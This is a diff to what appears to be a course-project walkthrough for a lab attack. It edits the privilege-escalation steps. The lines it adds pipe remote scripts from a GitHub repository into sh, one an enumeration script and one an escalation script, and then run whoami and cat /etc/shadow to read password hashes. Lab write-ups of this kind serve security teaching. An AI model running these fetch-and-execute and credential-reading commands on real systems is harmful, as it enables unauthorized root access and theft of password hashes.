@@ -93,13 +93,15 @@ ls
 
 ## Step 15: Gain Root Privileges
 ```bash
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
+curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/lightpeas.sh | sh
 ```
 ![25-run-lightpeas-script.png](../phase1/screenshots/25-run-lightpeas-script.png)
 ![26-lightpeas-enumeration-results.png](../phase1/screenshots/26-lightpeas-enumeration-results.png)
 
 ## Step 16: View /etc/shadow File
 ```bash
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
+whoami
 cat /etc/shadow
 ```
 ![27-run-escalate-script-and-root-access.png](../phase1/screenshots/27-run-escalate-script-and-root-access.png)
